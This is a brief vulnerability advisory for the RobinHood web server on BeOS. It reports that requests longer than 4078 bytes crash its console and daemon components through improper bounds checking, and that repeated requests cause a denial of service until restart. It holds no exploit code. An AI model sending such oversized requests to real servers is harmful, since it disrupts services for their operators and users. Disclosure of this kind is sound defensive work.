RobinHood is a HTTP/1.1 web server based upon libHTTP and is designed for the BeOS platform.

Improper bounds checking exists in code that handles requests (RHCWindow.cpp and RHLogger.cpp). The components RHConsole and RHDaemon will cease operations upon receiving a request consisting of over 4078 bytes. If RobinHood were to encounter such requests repeatedly, a prolonged denial of service attack may result. Restarting the application is required in order to regain normal functionality.
